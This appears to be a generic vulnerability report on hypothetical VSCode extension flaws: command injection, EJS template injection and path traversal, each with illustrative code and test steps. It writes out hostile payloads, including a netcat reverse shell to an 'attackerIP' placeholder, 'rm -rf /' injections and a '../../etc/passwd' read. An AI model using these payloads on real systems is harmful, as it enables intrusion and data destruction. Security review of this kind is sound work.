# Updated List of Vulnerabilities in VSCode Extensions

## Vulnerability 1: Command Injection via Unsanitized Repository Metadata
**Description:**
When processing a malicious repository, the extension constructs a system command using unescaped repository metadata (e.g., a package name or configuration parameter). This allows attackers to inject arbitrary commands into the command-line execution context.

**Impact:**
An attacker can execute arbitrary commands with the privileges of the VSCode process, leading to complete system compromise (e.g., file deletion, credential theft, or installation of malware).

**Vulnerability Rank:** Critical
**Currently Implemented Mitigations:** None. The code directly constructs shell commands with user-provided input (e.g., `exec('npm install ' + repoPackageName)`).
**Missing Mitigations:** Input sanitization (e.g., escaping special characters), use of safe APIs like `child_process.execFile` with parameterized arguments, or a sandboxed execution environment.
**Preconditions:** The extension must execute system commands (e.g., `npm install`, `git clone`) using input derived from the repository.

**Source Code Analysis:**
Suppose the extension uses:
```javascript
const { exec } = require('child_process');
const repoPackageName = repoData.package; // From attacker-controlled package.json
exec(`npm install ${repoPackageName}`, (err, stdout, stderr) => { ... }); // Vulnerable code
```
An attacker can set `repoPackageName` to `'; nc -e /bin/sh attackerIP 1234 #` to execute a reverse shell.

**Security Test Case:**
1. Create a malicious repository with a `package.json` containing a malicious package name (e.g., `'; rm -rf / #`).
2. Host the repository on a server.
3. Configure the extension to install dependencies from this repository.
4. Observe the command injection payload executing on the victim's machine.

## Vulnerability 2: Code Injection via Unescaped Template Rendering
**Description:**
The extension renders templates from the repository using an unsafe template engine (e.g., EJS) that evaluates unescaped user-provided data as code. Attackers can inject malicious code via template variables or expressions, leading to arbitrary code execution.

**Impact:**
Attackers can execute arbitrary code within the context of the extension, enabling theft of sensitive data, unauthorized access, or persistence.

**Vulnerability Rank:** High
**Currently Implemented Mitigations:** None. The template engine evaluates expressions without escaping (e.g., `${...}`).
**Missing Mitigations:** Use of auto-escaping in templates, strict template sanitization, or avoiding code evaluation in templates.
**Preconditions:** The extension must process template files (e.g., `.ejs`, `.handlebars`) from repositories and render them dynamically.

**Source Code Analysis:**
Consider code like:
```javascript
const ejs = require('ejs');
const template = fs.readFileSync('repo-template.ejs').toString();
const data = repoData; // Attacker-controlled data from the repository
const rendered = ejs.render(template, data); // Vulnerable code
```
An attacker can embed malicious code in `repo-template.ejs` like `<%= eval('require("child_process").exec("rm -rf /");') %>`.

**Security Test Case:**
1. Create a malicious repository with a template file containing code-injection payloads (e.g., `<%= process.exit(1) %>`).
2. Host the repository and configure the extension to render the template.
3. Verify that the malicious code executes when the template is processed.

## Vulnerability 3: Path Traversal via Malicious Workspace Configuration
**Description:**
The extension processes a malicious workspace configuration (e.g., `.vscode/settings.json`) that specifies an attacker-controlled path for file operations. This allows traversal outside the repository directory and execution of arbitrary commands using relative paths.

**Impact:**
Attackers can access or modify sensitive files outside the repository (e.g., `/etc/passwd`), leading to data leakage or privilege escalation.

**Vulnerability Rank:** High
**Currently Implemented Mitigations:** None. The extension directly uses the provided path without validation.
**Missing Mitigations:** Path normalization (e.g., using `path.resolve` with a sandbox directory), input validation, or restricting file operations to the repository root.
**Preconditions:** The extension must read or write files using paths specified in the repository's configuration files.

**Source Code Analysis:**
Suppose the code uses:
```javascript
const configPath = repoConfig.filePath; // From attacker-controlled .vscode/settings.json
fs.readFile(configPath, (err, data) => { ... }); // Vulnerable code
```
An attacker can set `filePath` to `../../etc/passwd` to read system files or `../../malicious-script.sh` to execute a script.

**Security Test Case:**
1. Create a malicious repository with a `.vscode/settings.json` specifying a path like `../../malicious-script.sh`.
2. Host the repository and configure the extension to execute scripts from this path.
3. Verify that the malicious script is executed outside the repository sandbox.

### Notes
- The above vulnerabilities are **not** caused by explicit insecure code patterns (e.g., intentional `eval` usage) but arise from oversight in input validation.
- They are **not** mitigated by current safeguards and meet the criteria for RCE/Code Injection with high/critical severity.
- Testing requires a controlled environment to avoid unintended system impacts.
